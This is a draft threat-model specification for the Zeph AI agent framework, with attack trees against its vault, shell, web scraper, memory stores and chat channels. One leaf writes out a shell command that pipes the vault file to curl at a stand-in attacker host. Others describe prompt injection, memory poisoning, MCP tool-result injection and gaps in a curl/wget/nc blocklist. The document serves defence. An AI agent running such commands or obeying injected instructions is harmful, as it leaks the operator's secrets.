---
aliases:
  - MATRA Threat Model
  - 069 Threat Model
tags:
  - sdd
  - security
  - threat-model
created: 2026-06-13
status: draft
related:
  - "[[constitution]]"
  - "[[001-system-invariants/spec]]"
  - "[[010-security/spec]]"
  - "[[050-security-capability-governance/spec]]"
  - "[[055-cocoon/spec]]"
---

# 069 — MATRA Threat Model

Applies the **MATRA** methodology (arXiv:2605.10763) — a structured, asset-centric threat
modelling framework — to Zeph. This spec is the canonical security reference for all future
changes that touch assets listed in §1.

**In-scope:** the Zeph process and its immediate I/O boundaries (vault, DB, Qdrant, shell,
web scrape, channel adapters, MCP client, subagent transcripts, orchestration planner).

**Out-of-scope:** the operator's OS/network perimeter, third-party LLM providers' own
security posture, upstream MCP server security.

---

## §1 Asset Inventory

| # | Asset | Location / crate | Sensitivity | Existing control |
|---|-------|-----------------|-------------|-----------------|
| A1 | Age vault (keys + encrypted secrets) | `zeph-vault`, `~/.local/share/zeph/vault.age` | Critical | Age AEAD encryption; `zeroize`-on-drop; env-backend disabled in prod |
| A2 | SQLite memory DB (messages, entities, skill trust) | `zeph-memory`, `zeph-db` | High | File-permission hardening (`fs_secure`); no remote access; WAL journal |
| A3 | Qdrant vector index (embeddings, semantic memory) | `zeph-memory` (Qdrant client) | High | Local-only by default; no credential store in config (key via vault) |
| A4 | ShellExecutor (arbitrary OS command execution) | `zeph-tools` | Critical | macOS Seatbelt sandbox (`SeatbeltProfile`); `ScopedToolExecutor` allow-list; VIGIL pre-dispatch tripwire |
| A5 | WebScrapeExecutor (outbound HTTP + HTML parse) | `zeph-tools` | High | `ScrapeConfig` allowlist; SSRF guard (`SsrfGuard`); egress logging (`EgressEvent`) |
| A6 | Telegram adapter (inbound messages + bot token) | `zeph-channels` | High | `allowed_users` access control; bot token in vault; guest-mode sandboxing |
| A7 | Discord adapter (webhook + DM) | `zeph-channels` | High | Bearer token in vault; channel-id allowlist |
| A8 | Slack adapter (app token + events) | `zeph-channels` | High | App token in vault; workspace-id allowlist |
| A9 | CLI adapter (local process stdin/stdout) | `zeph-channels` | Medium | OS user isolation; `-y` flag gate |
| A10 | MCP client egress (tool definitions + call results) | `zeph-mcp` | High | Tool injection detection; quota limits; OAP authorization; collision detection |
| A11 | Subagent transcripts (JSONL, tool results, memory writes) | `zeph-subagent` | High | `FilteredToolExecutor` policy gate; `PermissionGrants` TTL; `max_trust_level` propagation |
| A12 | Orchestration planner output (LLM-generated task graph) | `zeph-orchestration` | Medium | Schema validation; `max_tasks` limit; `PlanVerifier` completeness check |

---

## §2 Attack Trees

Each tree starts from an adversarial goal and branches to leaf attack steps.

### 2.1 Vault Key Extraction (A1)

```
[GOAL] Extract age vault master key or plaintext secrets

├─ 2.1.1 Prompt injection via user message
│   └─ craft input to make agent echo vault decryption output
│       └─ LEAF: LLM outputs `vault get KEY` response verbatim to channel
│
├─ 2.1.2 ShellExecutor command injection
│   └─ inject shell cmd to read vault file + exfiltrate via curl
│       └─ LEAF: `cat ~/.local/share/zeph/vault.age | curl attacker.io -d @-`
│
├─ 2.1.3 Memory poisoning (A2/A3 → A1)
│   └─ poison semantic memory with false system-prompt override
│       └─ LEAF: agent follows poisoned instruction to print vault keys
│
└─ 2.1.4 MCP tool result injection (A10 → A1)
    └─ malicious MCP server returns tool_result with embedded prompt
        └─ LEAF: injected prompt causes agent to call `vault get` and echo result
```

### 2.2 Shell Remote Code Execution / Sandbox Escape (A4)

```
[GOAL] Execute arbitrary code outside the Seatbelt sandbox

├─ 2.2.1 Prompt injection → ShellExecutor
│   └─ user/channel message contains hidden instruction
│       └─ LEAF: agent executes attacker-controlled command under shell allow-list
│
├─ 2.2.2 Tool-name spoofing via MCP collision (A10 → A4)
│   └─ MCP server registers tool with same name as native shell tool
│       └─ LEAF: routing sends call to native shell instead of MCP stub
│
├─ 2.2.3 Seatbelt profile bypass
│   └─ attacker finds denied operation missing from deny-list
│       └─ LEAF: executes network write or FS write outside sandboxed path
│
└─ 2.2.4 Spawned sub-agent without scope enforcement (NEW — see §5)
    └─ planner emits `network_scope: deny` on a task node
        └─ LEAF: spawned sub-agent ignores field; still has full network access
```

### 2.3 SSRF via WebScrapeExecutor (A5)

```
[GOAL] Reach internal network endpoints via web scrape

├─ 2.3.1 User-supplied URL in prompt
│   └─ crafted URL targets 169.254.169.254 or 127.0.0.1
│       └─ LEAF: `SsrfGuard` bypass if allowlist not configured
│
├─ 2.3.2 Redirect chain to private IP
│   └─ public URL 302-redirects to metadata endpoint
│       └─ LEAF: `reqwest` follows redirect; `SsrfGuard` only checks initial URL
│
└─ 2.3.3 DNS rebinding
    └─ domain resolves to public IP at DNS time, private IP at connect time
        └─ LEAF: connect-time IP not re-validated by `SsrfGuard`
```

### 2.4 Cross-Session Memory Poisoning via Qdrant (A3)

```
[GOAL] Persist adversarial instructions across sessions via semantic memory

├─ 2.4.1 Write-gate bypass
│   └─ craft message that passes `MemoryWriteGate` regex scoring
│       └─ LEAF: poisoned embedding stored; retrieved in future sessions as "memory"
│
├─ 2.4.2 Graph-entity injection
│   └─ entity extractor creates adversarial node in knowledge graph
│       └─ LEAF: future BFS recall surfaces attacker-controlled instructions
│
└─ 2.4.3 Skill injection via trace extraction (A11 → A3 → A12)
    └─ subagent transcript contains crafted SKILL.md candidate
        └─ LEAF: AutoSkill A1 promotes candidate; skill invoked in future sessions
```

### 2.5 Channel Exfiltration (A6–A9)

```
[GOAL] Exfiltrate sensitive data through an output channel

├─ 2.5.1 Prompt injection → Telegram/Discord DM
│   └─ crafted user message instructs agent to forward DB contents via send_message
│       └─ LEAF: agent sends full conversation history to attacker-controlled chat
│
├─ 2.5.2 Token extraction via MCP tool injection (A10 → A6)
│   └─ MCP result embeds prompt to log bot token
│       └─ LEAF: agent logs TELEGRAM_BOT_TOKEN to chat output
│
└─ 2.5.3 Egress without attribution (bypasses EgressEvent)
    └─ native tool with no `ToolCall.skill_egress_attribution` set
        └─ LEAF: outbound HTTP invisible to `AuditEntry`/egress log
```

---

## §3 Control Mapping and Risk Scores

| Attack leaf | Control(s) | Residual risk |
|-------------|-----------|---------------|
| 2.1.1 LLM echoes vault output | PII filter + exfil guard in `zeph-sanitizer`; `OutputVerifier` | **Medium** — sanitizer is regex-based; LLM can paraphrase |
| 2.1.2 Shell cmd injection | `ScopedToolExecutor` allow-list; VIGIL pre-dispatch tripwire; Seatbelt | **Low** — three independent layers |
| 2.1.3 Memory poisoning → vault echo | `MemoryWriteGate` + write-gate scoring; `ShadowSentinel` safety probe | **Medium** — write-gate is heuristic; LLM judge adds cost |
| 2.1.4 MCP injection → vault echo | MCP injection detection; tool quota; OAP authorization | **Medium** — LLM-level injection still possible |
| 2.2.1 Prompt → ShellExecutor | VIGIL tripwire; `ScopedToolExecutor`; Seatbelt sandbox | **Low** |
| 2.2.2 MCP tool name collision | Collision detection in `zeph-mcp`; `normalize_tool_id` | **Low** |
| 2.2.3 Seatbelt profile bypass | Deny-first profile; audited by `SeatbeltProfile` | **Medium** — depends on profile completeness |
| 2.2.4 Spawned sub-agent scope (§5) | `NetworkDenyToolExecutor` blocks `curl`/`wget`/`nc`/`ncat`/`netcat` in `bash` calls, and unconditionally blocks the `web_scrape`/`fetch` tool, for both spawned sub-agents and `RunInline` tasks (OQ-1, resolved) | **Medium** — detection is tool/command-identity matching, not sandbox-level; MCP-provided tools and obfuscated shell commands are not covered |
| 2.3.1 SSRF direct | `SsrfGuard` + `ScrapeConfig` allowlist | **Low** — if allowlist is configured |
| 2.3.2 SSRF via redirect | `SsrfGuard` (initial URL only) | **Medium** — redirect not re-validated |
| 2.3.3 DNS rebinding | No connect-time IP re-validation | **High** — no current control |
| 2.4.1 Write-gate bypass | `MemoryWriteGate` heuristic + LLM judge | **Medium** |
| 2.4.2 Graph entity injection | `PostExtractValidator` (sanitizer on write path) | **Medium** |
| 2.4.3 Skill injection via trace | `quarantined` trust level; user review required | **Low** |
| 2.5.1 Channel exfiltration via prompt | Exfil guard in `zeph-sanitizer`; `OutputVerifier` | **Medium** — regex-evadable |
| 2.5.2 Token extraction via MCP | PII filter; vault — token never in plaintext in process | **Low** |
| 2.5.3 Egress without attribution | `EgressEvent` coverage check; egress logging | **Medium** — coverage is incomplete |

---

## §4 Uncontrolled Blast Radius

The following paths have **no or weak controls** today:

### 4.1 Per-task network egress is bounded by orchestration on a best-effort basis (RESOLVED, OQ-1)

The orchestration planner can annotate a task with `network_scope: Deny`. This is now
enforced on both dispatch paths: `handle_scheduler_spawn_action` (spawned sub-agents) and
`handle_run_inline_action` (`RunInline` tasks — the latter by temporarily wrapping the
parent agent's own `tool_executor` for the duration of that inline turn, then restoring
it) both wrap the task's tool executor with `NetworkDenyToolExecutor`, which blocks
network-egress `bash` commands (`curl`/`wget`/`nc`/`ncat`/`netcat`) and the native
`web_scrape`/`fetch` tool (OQ-1, resolved, #6030). Residual gap: MCP-provided tools are not
inspected and may still perform their own HTTP egress — see §5.2.

### 4.2 Asset-sensitivity is not propagated to planner tool scoping

A Critical-sensitivity task (e.g. one that reads the vault) has no automatic `ScopedToolExecutor`
restriction. The planner annotates `asset_sensitivity: Confidential` (after #3934), but the
dispatch path does not yet read that field to tighten the tool allow-list. This creates a
path where a compromised task leaks vault output into a later Low-trust task's `depends_on`
context injection.

### 4.3 Cross-task data flow: Critical-sensitivity → Low-trust consumer

When task A has `asset_sensitivity: Confidential` and its output is injected into task B's
context via `dependency_context_budget`, task B's sub-agent gains access to the full plaintext
output. The planner does not currently redact or gate this flow.

### 4.4 SSRF via redirect chain (2.3.2) and DNS rebinding (2.3.3)

`SsrfGuard` validates the initial URL but does not re-validate after HTTP redirects or
at TCP connect time. These represent **High** residual risk when network access is allowed.

---

## §5 Orchestration-Specific Threat Surface (issue #3934)

### 5.1 NetworkScope — asset sensitivity registry

Issue #3934 adds two types to address the uncontrolled paths identified in §4:

**`NetworkScope`** (in `crates/zeph-orchestration/src/graph.rs`): controls network egress
per task node. Three variants: `Inherit` (default — inherit global `allow_network`), `Allow`
(explicit permit), `Deny` (explicit deny).

**`AssetSensitivity`** (in `crates/zeph-config/src/experiment.rs`): classifies assets
accessed by a task. Three levels: `Public` (default), `Internal` (user data, memory),
`Confidential` (vault keys, credentials). Set per-task on `TaskNode::asset_sensitivity`
and graph-wide on `OrchestrationConfig::default_asset_sensitivity`.

### 5.2 Enforcement caveat (MANDATORY — read before using these types)

> **`NetworkScope::Deny` is enforced (best-effort) on both dispatch paths;
> `AssetSensitivity` remains advisory everywhere.**
>
> `handle_scheduler_spawn_action` (spawned sub-agents) reads `TaskNode::network_scope` and
> sets `SpawnContext::network_denied` accordingly; `build_filtered_executor` wraps the
> sub-agent's tool executor with `NetworkDenyToolExecutor` when `Deny` (OQ-1, resolved,
> #6030). `handle_run_inline_action` (`RunInline` path, `scheduler_loop.rs`) reads the same
> field and, when `Deny`, temporarily replaces the parent agent's own `self.tool_executor`
> with a `NetworkDenyToolExecutor`-wrapped copy for the duration of that single inline turn,
> restoring it afterward — `RunInline` tasks share the parent's tool loop, so there is no
> per-task executor to wrap independently.
>
> `NetworkDenyToolExecutor` blocks two classes of call: `bash` invocations of `curl`,
> `wget`, `nc`, `ncat`, `netcat`; and any call to the native `web_scrape`/`fetch` tool
> (blocked unconditionally — no command inspection needed, since these tools have no
> non-network purpose). **Known gap**: MCP-provided tools are not inspected.
>
> `AssetSensitivity` follows the same advisory pattern as `token_budget_cents` (warn-only,
> pre-v1.0.0) on both paths — `TaskNode::network_scope` enforcement does not extend to
> `asset_sensitivity` (OQ-2 open).

This means: **`network_scope: Deny` is a best-effort tool/command-identity block, not a
sandbox-level guarantee** — it does not protect against obfuscated or subshell-embedded
shell commands the underlying blocklist heuristic misses (see §2.2.3), nor against MCP
tools performing their own HTTP egress. `asset_sensitivity` remains a planner annotation
for future enforcement only (OQ-2).

### 5.3 Planner JSON schema exposure

`NetworkScope` and `AssetSensitivity` are currently set only via direct `TaskNode` construction
(e.g. by test helpers or future planner output). The LLM planner does **not** yet emit these
fields — the `PlannedTask` DTO does not include `network_scope` or `asset_sensitivity`.
`schemars::JsonSchema` is derived for future planner schema integration; that wiring is tracked
in OQ-1 and OQ-2.

---

## §6 Key Invariants

**INVARIANT-1 (Vault-zero):** The age vault master key MUST NOT appear in logs, debug dumps,
LLM payloads, or channel output. `VaultProvider::get()` returns a `Secret<String>`; callers
MUST `zeroize` it immediately after use. `NEVER` pass vault keys via environment variables.

**INVARIANT-2 (Shell-scoped):** `ShellExecutor` MUST only be reachable through
`ScopedToolExecutor` with an explicit allow-list. `NEVER` invoke `ShellExecutor` directly
from the agent loop without passing through the capability gate.

**INVARIANT-3 (SSRF-guard):** `WebScrapeExecutor` MUST check `SsrfGuard` before every
outbound HTTP request, including after redirects. `NEVER` follow redirects without
re-validating the target IP. *(Current implementation does not satisfy this for redirects —
tracked as a finding in §4.4.)*

**INVARIANT-4 (Memory-write-gate):** All writes to Qdrant and the graph entity store MUST
pass through `MemoryWriteGate` scoring. `NEVER` bypass the write gate for "trusted" inputs.

**INVARIANT-5 (NetworkScope-enforcement-scope):** `network_scope: Deny` on a `TaskNode` is
enforced for both spawned sub-agents and `RunInline` tasks via `NetworkDenyToolExecutor`
(OQ-1, resolved), which blocks `bash` network commands and the native `web_scrape`/`fetch`
tool. This is a best-effort tool/command-identity block, not a sandbox boundary — it does
not cover obfuscated shell commands, subshell embedding beyond what the underlying
blocklist heuristic catches, or MCP tool calls performing their own HTTP egress. `NEVER`
represent it as a hard security boundary.

**INVARIANT-6 (AssetSensitivity-advisory):** `asset_sensitivity: Confidential` on a `TaskNode`
does NOT cause the dispatcher to tighten the tool allow-list in the current implementation.
`NEVER` rely on this field for access control until §4.3 is addressed.

**INVARIANT-7 (Egress-logging):** Every outbound HTTP call from `WebScrapeExecutor` and
MCP client MUST emit an `EgressEvent` with a non-empty `ToolCall.skill_egress_attribution`.

---

## §7 Open Questions / Deferred Enforcement

| # | Question | Tracked by |
|---|----------|-----------|
| OQ-1 | ~~Wire `network_scope: Deny` to `ShellConfig.allow_network` in `handle_scheduler_spawn_action` and `build_spawn_context`.~~ **Resolved** (#6030): both `handle_scheduler_spawn_action` (spawned sub-agents, via `SpawnContext::network_denied`) and `handle_run_inline_action` (`RunInline` tasks, via a temporary swap of `self.tool_executor`) wrap the task's tool executor with `NetworkDenyToolExecutor` instead of mutating the shared `ShellConfig` directly (avoids affecting sibling tasks / the parent agent outside the wrapped call). Blocks `bash` network commands and the native `web_scrape`/`fetch` tool. Remaining known gap: MCP-provided tools are not inspected. | #6030 |
| OQ-2 | Wire `asset_sensitivity ≥ Confidential` to auto-tighten `ScopedToolExecutor` allow-list at dispatch time. | Follow-up issue after #3934 |
| OQ-3 | Re-validate HTTP target IP after each redirect in `WebScrapeExecutor` to close SSRF-via-redirect (§4.4 / 2.3.2). | See `010-security/spec.md` |
| OQ-4 | Add connect-time IP validation (DNS rebinding guard, §4.4 / 2.3.3). | See `010-security/spec.md` |
| OQ-5 | Redact or gate cross-task context injection when source task has `asset_sensitivity ≥ Confidential` (§4.3). | Architecture decision required |
| OQ-6 | Should `network_scope`/`asset_sensitivity` be exposed in the planner JSON schema before enforcement exists? | Policy decision; see §5.3 |
